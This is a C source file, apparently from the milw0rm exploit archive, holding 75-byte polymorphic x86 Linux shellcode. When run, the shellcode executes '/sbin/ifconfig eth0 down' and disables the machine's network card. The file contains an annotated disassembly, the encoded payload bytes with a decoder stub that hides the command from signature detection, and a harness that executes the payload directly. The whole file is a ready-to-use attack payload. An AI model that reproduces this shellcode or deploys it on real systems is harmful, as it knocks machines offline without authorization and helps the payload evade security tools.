/*  Linux x86 - Polymorphic shellcode for disable Network Card (default eth0) - 75 bytes
 *  Jonathan Salwan < submit [!] shell-storm.org >
 *
 *	! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ !
 *
 *
 * Disassembly of section .text:
 *
 * 08048060 <_start>:
 * 8048060:       6a 0b                   push   $0xb
 * 8048062:       58                      pop    %eax
 * 8048063:       99                      cltd
 * 8048064:       52                      push   %edx
 * 8048065:       68 64 6f 77 6e          push   $0x6e776f64
 * 804806a:       89 e6                   mov    %esp,%esi
 * 804806c:       52                      push   %edx
 * 804806d:       68 65 74 68 30          push   $0x30687465  < (eth0) you can change it for other Network card
 * 8048072:       89 e1                   mov    %esp,%ecx
 * 8048074:       52                      push   %edx
 * 8048075:       68 6e 66 69 67          push   $0x6769666e
 * 804807a:       68 69 66 63 6f          push   $0x6f636669
 * 804807f:       68 69 6e 2f 2f          push   $0x2f2f6e69
 * 8048084:       68 2f 2f 73 62          push   $0x62732f2f
 * 8048089:       89 e3                   mov    %esp,%ebx
 * 804808b:       52                      push   %edx
 * 804808c:       56                      push   %esi
 * 804808d:       51                      push   %ecx
 * 804808e:       53                      push   %ebx
 * 804808f:       89 e1                   mov    %esp,%ecx
 * 8048091:       cd 80                   int    $0x80
 *
 */

main()
{
char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x51\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x6b\x0c\x59\x9a\x53\x69\x65\x70"
			"\x78\x6f\x8a\xe7\x53\x69\x66\x75"
			"\x69\x31\x8a\xe2\x53\x69\x6f\x67"
			"\x6a\x68\x69\x6a\x67\x64\x70\x69"
			"\x6a\x6f\x30\x30\x69\x30\x30\x74"
			"\x63\x8a\xe4\x53\x57\x52\x54\x8a"
			"\xe2\xce\x81";

       	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}

// milw0rm.com [2009-08-26]